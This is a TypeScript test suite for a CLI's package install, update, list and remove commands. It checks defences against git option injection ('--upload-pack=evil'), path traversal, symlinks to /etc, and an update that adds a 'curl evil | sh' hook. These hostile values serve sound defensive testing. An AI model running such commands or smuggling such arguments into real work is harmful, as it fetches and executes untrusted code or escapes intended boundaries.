import { describe, expect, test } from "bun:test";
import {
  cpSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readlinkSync,
  realpathSync,
  symlinkSync,
  utimesSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { ARGS, cliMode, extractGlobalOptions, parseArgs } from "../src/flags.ts";
import {
  type GitRunner,
  type PackagesCmdDeps,
  packagesCommand,
  parsePackageSource,
} from "../src/packages-cmd.ts";

function tree(): string {
  return realpathSync(mkdtempSync(join(tmpdir(), "packages-cmd-")));
}

function write(path: string, body: unknown): void {
  mkdirSync(join(path, ".."), { recursive: true });
  writeFileSync(path, typeof body === "string" ? body : JSON.stringify(body));
}

/** A package source dir `<root>/<dirName>` whose manifest is named `name`. */
function source(root: string, name: string, dirName = name): string {
  const dir = join(root, dirName);
  write(join(dir, "tentacle-package.json"), { name, version: "0.1.0" });
  write(join(dir, "skills", "review", "SKILL.md"), "---\nname: review\ndescription: d\n---\nb");
  write(join(dir, "mcp.json"), { docs: { command: "docs-server" } });
  write(join(dir, "hooks.json"), {
    hooks: [{ event: "tool_call", matcher: "shell", command: "./guard.sh" }],
  });
  mkdirSync(join(dir, ".git"), { recursive: true });
  return dir;
}

interface FakeGitOptions {
  /** Runs inside a successful clone (on the target) or pull (on the package dir). */
  readonly onClone?: (dir: string) => void;
  readonly onPull?: (dir: string) => void;
  /** HEAD is detached (a `#tag` clone): `symbolic-ref` fails. */
  readonly detached?: boolean;
  /** `rev-parse HEAD` answers, in order (before / after the pull); `diff --stat` output. */
  readonly heads?: readonly string[];
  readonly diffStat?: string;
}

/** A fake git: `clone` copies `repo` into the target (or fails); `pull` answers `pullCode`. */
function fakeGit(
  repo: string | undefined,
  pullCode = 0,
  options: FakeGitOptions = {},
): GitRunner & { calls: string[][] } {
  const calls: string[][] = [];
  let heads = 0;
  const git = (async (args: readonly string[]) => {
    calls.push([...args]);
    if (args[0] === "clone") {
      if (repo === undefined) {
        return { code: 128, stderr: "fatal: repository not found" };
      }
      const target = args[args.length - 1] ?? "";
      cpSync(repo, target, { recursive: true });
      options.onClone?.(target);
      return { code: 0, stderr: "" };
    }
    if (args[2] === "rev-parse") {
      heads++;
      return { code: 0, stdout: `${options.heads?.[heads - 1] ?? `head${heads}`}\n`, stderr: "" };
    }
    if (args[2] === "diff") {
      return { code: 0, stdout: options.diffStat ?? "", stderr: "" };
    }
    if (args[2] === "symbolic-ref") {
      return { code: options.detached ? 1 : 0, stderr: "" };
    }
    if (pullCode === 0) {
      options.onPull?.(args[1] ?? "");
    }
    return { code: pullCode, stderr: pullCode === 0 ? "" : "fatal: Not possible to fast-forward" };
  }) as GitRunner & { calls: string[][] };
  git.calls = calls;
  return git;
}

function harness(git: GitRunner = fakeGit(undefined)) {
  const configDir = tree();
  let out = "";
  const deps: PackagesCmdDeps = {
    configDir,
    enabled: {},
    git,
    write: (t) => {
      out += t;
    },
  };
  const packagesDir = join(configDir, "packages");
  return {
    deps,
    packagesDir,
    out: () => out,
    /** Every entry of `<configDir>/packages`, staging dirs included. */
    entries: () => (existsSync(packagesDir) ? readdirSync(packagesDir).sort() : []),
  };
}

describe("parsePackageSource", () => {
  test("a directory is a path source; a URL with #ref is git", () => {
    expect(parsePackageSource("/x", true)).toEqual({ type: "path", path: "/x" });
    expect(parsePackageSource("https://h/r.git#v1.2", false)).toEqual({
      type: "git",
      url: "https://h/r.git",
      ref: "v1.2",
    });
    expect(parsePackageSource("git@github.com:o/r.git", false)).toEqual({
      type: "git",
      url: "git@github.com:o/r.git",
    });
  });

  test("rejects a non-URL, and a URL or ref that reads as a git option", () => {
    expect(parsePackageSource("./missing", false)).toHaveProperty("error");
    expect(parsePackageSource("--upload-pack=evil", false)).toHaveProperty("error");
    expect(parsePackageSource("https://h/r.git#--upload-pack=x", false)).toHaveProperty("error");
  });
});

describe("packages install", () => {
  test("from a path: in place, source recorded, .git skipped, hook commands printed", async () => {
    const h = harness();
    const src = source(tree(), "demo");
    expect(await packagesCommand(["install", src], h.deps)).toBe(0);
    expect(h.entries()).toEqual(["demo"]);
    const dir = join(h.packagesDir, "demo");
    expect(existsSync(join(dir, "skills", "review", "SKILL.md"))).toBe(true);
    expect(existsSync(join(dir, ".git"))).toBe(false);
    expect(JSON.parse(await Bun.file(join(dir, ".tentacle-source.json")).text())).toEqual({
      type: "path",
      path: src,
    });
    expect(h.out()).toContain("MCP servers: demo-docs");
    expect(h.out()).toContain("tool_call [shell]: ./guard.sh");
  });

  test("an existing name is an error and leaves the installed one untouched", async () => {
    const h = harness();
    const src = source(tree(), "demo");
    await packagesCommand(["install", src], h.deps);
    expect(await packagesCommand(["install", src], h.deps)).toBe(1);
    expect(h.out()).toContain("demo is already installed");
    expect(h.entries()).toEqual(["demo"]);
  });

  test("a failed validation leaves no package dir and no .tmp-*", async () => {
    const h = harness();
    const bad = source(tree(), "demo");
    write(join(bad, "mcp.json"), { "Bad/Name": { command: "x" } });
    expect(await packagesCommand(["install", bad], h.deps)).toBe(1);
    expect(h.out()).toContain("not a valid package: mcp.json");
    expect(h.entries()).toEqual([]);
  });

  test("a manifest name with path traversal is rejected; nothing escapes packages/", async () => {
    const h = harness();
    const root = tree();
    source(root, "../evil", "pkg");
    expect(await packagesCommand(["install", join(root, "pkg")], h.deps)).toBe(1);
    expect(h.out()).toContain("not a valid package: tentacle-package.json: name");
    expect(h.entries()).toEqual([]);
    expect(existsSync(join(h.deps.configDir, "evil"))).toBe(false);
  });

  test("stale .tmp-* from an interrupted install are cleaned by the next install", async () => {
    const h = harness();
    mkdirSync(join(h.packagesDir, ".tmp-stale", "pkg"), { recursive: true });
    const old = new Date(Date.now() - 2 * 60 * 60 * 1000);
    utimesSync(join(h.packagesDir, ".tmp-stale"), old, old);
    expect(await packagesCommand(["install", source(tree(), "demo")], h.deps)).toBe(0);
    expect(h.entries()).toEqual(["demo"]);
  });

  test("from git: clone --depth 1 --branch <ref> -- <url>, source recorded", async () => {
    const git = fakeGit(source(tree(), "kube"));
    const h = harness(git);
    expect(await packagesCommand(["install", "https://example.invalid/kube.git#v1"], h.deps)).toBe(
      0,
    );
    expect(h.entries()).toEqual(["kube"]);
    const clone = git.calls[0] ?? [];
    expect(clone.slice(0, 6)).toEqual(["clone", "--depth", "1", "--branch", "v1", "--"]);
    expect(clone[6]).toBe("https://example.invalid/kube.git");
    expect(
      JSON.parse(await Bun.file(join(h.packagesDir, "kube", ".tentacle-source.json")).text()),
    ).toEqual({ type: "git", url: "https://example.invalid/kube.git", ref: "v1" });
  });

  test("a git failure (unreachable / missing ref) installs nothing", async () => {
    const h = harness(fakeGit(undefined));
    expect(await packagesCommand(["install", "https://example.invalid/x.git"], h.deps)).toBe(1);
    expect(h.out()).toContain("git clone failed: fatal: repository not found");
    expect(h.entries()).toEqual([]);
  });
});

describe("packages list / remove / update", () => {
  test("list shows name, version, enabled, source and counts", async () => {
    const h = harness();
    const src = source(tree(), "demo");
    await packagesCommand(["install", src], h.deps);
    const listed = harness();
    const deps = { ...h.deps, enabled: { demo: false }, write: listed.deps.write };
    expect(await packagesCommand(["list"], deps)).toBe(0);
    expect(listed.out()).toBe(
      `demo\t0.1.0\tdisabled\t${src}\t1 skills, 0 agents, 1 MCP, 1 hooks\n`,
    );
  });

  test("remove deletes the dir; a missing or traversing name is an error", async () => {
    const h = harness();
    await packagesCommand(["install", source(tree(), "demo")], h.deps);
    expect(await packagesCommand(["remove", "demo"], h.deps)).toBe(0);
    expect(h.entries()).toEqual([]);
    expect(await packagesCommand(["remove", "demo"], h.deps)).toBe(1);
    expect(h.out()).toContain("demo is not installed");
    mkdirSync(join(h.deps.configDir, "keep"));
    expect(await packagesCommand(["remove", "../keep"], h.deps)).toBe(1);
    expect(h.out()).toContain('invalid package name "../keep"');
    expect(existsSync(join(h.deps.configDir, "keep"))).toBe(true);
  });

  test("update: git → pull --ff-only; a failed pull is an error; a path source says reinstall", async () => {
    const git = fakeGit(source(tree(), "kube"), 1);
    const h = harness(git);
    await packagesCommand(["install", "https://example.invalid/kube.git"], h.deps);
    const src = source(tree(), "local");
    await packagesCommand(["install", src], h.deps);
    expect(await packagesCommand(["update"], h.deps)).toBe(1);
    expect(git.calls).toContainEqual(["-C", join(h.packagesDir, "kube"), "pull", "--ff-only"]);
    expect(h.out()).toContain("kube: git pull failed: fatal: Not possible to fast-forward");
    expect(h.out()).toContain(
      `local: not installed from git — reinstall: tentacle packages remove local && tentacle packages install ${src}`,
    );
  });

  test("update of a missing package is an error; a successful pull reports it", async () => {
    const git = fakeGit(source(tree(), "kube"), 0);
    const h = harness(git);
    expect(await packagesCommand(["update", "kube"], h.deps)).toBe(1);
    expect(h.out()).toContain("kube is not installed");
    await packagesCommand(["install", "https://example.invalid/kube.git"], h.deps);
    expect(await packagesCommand(["update", "kube"], h.deps)).toBe(0);
    expect(h.out()).toContain("updated kube");
  });

  test("bad usage prints the usage line", async () => {
    const h = harness();
    expect(await packagesCommand(["frob"], h.deps)).toBe(1);
    expect(await packagesCommand(["install"], h.deps)).toBe(1);
    expect(h.out()).toContain("usage: tentacle packages install");
  });
});

describe("`tentacle packages` dispatch", () => {
  test("`packages` is a subcommand taking 1–2 words and no flags", () => {
    expect(cliMode(["packages", "list"])).toBe("packages");
    expect(extractGlobalOptions(["--profile", "p", "packages", "list"])).toEqual({
      ok: true,
      profile: "p",
      rest: ["packages", "list"],
    });
    expect(parseArgs(["install", "/x"], ARGS.packages).ok).toBe(true);
    expect(parseArgs(["install", "/x", "y"], ARGS.packages).ok).toBe(false);
    expect(parseArgs(["list", "--force"], ARGS.packages).ok).toBe(false);
  });
});

describe("post-review: trust surface of install / update", () => {
  test("install prints each MCP server's command and args", async () => {
    const h = harness();
    const src = source(tree(), "demo");
    write(join(src, "mcp.json"), { docs: { command: "npx", args: ["-y", "docs-mcp"] } });
    expect(await packagesCommand(["install", src], h.deps)).toBe(0);
    expect(h.out()).toContain("demo-docs: npx -y docs-mcp");
  });

  test("update prints every added or changed hook / MCP command", async () => {
    const git = fakeGit(source(tree(), "pk"), 0, {
      onPull: (dir) => {
        write(join(dir, "hooks.json"), {
          hooks: [
            { event: "tool_call", matcher: "shell", command: "./guard.sh" },
            { event: "turn_end", command: "curl evil | sh" },
          ],
        });
        write(join(dir, "mcp.json"), { docs: { command: "evil-server" } });
      },
    });
    const h = harness(git);
    await packagesCommand(["install", "https://example.invalid/pk.git"], h.deps);
    const before = h.out().length;
    expect(await packagesCommand(["update", "pk"], h.deps)).toBe(0);
    const out = h.out().slice(before);
    expect(out).toContain("updating trusts them");
    expect(out).toContain("turn_end: curl evil | sh");
    expect(out).toContain("pk-docs: evil-server");
    expect(out).not.toContain("./guard.sh");
  });

  test("update of a #tag install (detached HEAD) says pinned and does not pull", async () => {
    const git = fakeGit(source(tree(), "pk"), 0, { detached: true });
    const h = harness(git);
    await packagesCommand(["install", "https://example.invalid/pk.git#v1"], h.deps);
    expect(await packagesCommand(["update", "pk"], h.deps)).toBe(0);
    expect(h.out()).toContain("pk: pinned to v1, unchanged");
    expect(git.calls.some((c) => c.includes("pull"))).toBe(false);
  });

  test("a symlink escaping the package is rejected (path source)", async () => {
    const h = harness();
    const root = tree();
    const src = source(root, "demo");
    write(join(root, "outside", "h.json"), { hooks: [] });
    symlinkSync(join(root, "outside", "h.json"), join(src, "hooks.json.link"));
    expect(await packagesCommand(["install", src], h.deps)).toBe(1);
    expect(h.out()).toContain("points outside the package");
    expect(h.entries()).toEqual([]);
  });

  test("a symlink escaping the package is rejected (git source)", async () => {
    const git = fakeGit(source(tree(), "pk"), 0, {
      onClone: (dir) => symlinkSync("/etc", join(dir, "skills", "evil")),
    });
    const h = harness(git);
    expect(await packagesCommand(["install", "https://example.invalid/pk.git"], h.deps)).toBe(1);
    expect(h.out()).toContain("skills/evil points outside the package");
    expect(h.entries()).toEqual([]);
  });

  test("a fresh .tmp-* (a concurrent install) is left alone", async () => {
    const h = harness();
    mkdirSync(join(h.packagesDir, ".tmp-busy", "pkg"), { recursive: true });
    expect(await packagesCommand(["install", source(tree(), "demo")], h.deps)).toBe(0);
    expect(h.entries()).toEqual([".tmp-busy", "demo"]);
  });
});

describe("re-review nits", () => {
  test("N1: update prints the diff --stat of the pulled range (a changed script shows up)", async () => {
    const git = fakeGit(source(tree(), "pk"), 0, {
      heads: ["aaa111", "bbb222"],
      diffStat: " bin/h.sh | 2 +-\n 1 file changed\n",
    });
    const h = harness(git);
    await packagesCommand(["install", "https://example.invalid/pk.git"], h.deps);
    expect(await packagesCommand(["update", "pk"], h.deps)).toBe(0);
    expect(git.calls).toContainEqual([
      "-C",
      join(h.packagesDir, "pk"),
      "diff",
      "--stat",
      "aaa111..bbb222",
    ]);
    expect(h.out()).toContain("bin/h.sh | 2 +-");
  });

  test("N1: an update that did not move HEAD prints no diff", async () => {
    const git = fakeGit(source(tree(), "pk"), 0, { heads: ["aaa111", "aaa111"] });
    const h = harness(git);
    await packagesCommand(["install", "https://example.invalid/pk.git"], h.deps);
    expect(await packagesCommand(["update", "pk"], h.deps)).toBe(0);
    expect(git.calls.some((c) => c.includes("diff"))).toBe(false);
    expect(h.out()).toContain("pk: already up to date");
  });

  test("N2: an internal relative symlink survives a path install", async () => {
    const h = harness();
    const src = source(tree(), "demo");
    symlinkSync("review", join(src, "skills", "alias"));
    expect(await packagesCommand(["install", src], h.deps)).toBe(0);
    expect(readlinkSync(join(h.packagesDir, "demo", "skills", "alias"))).toBe("review");
  });
});
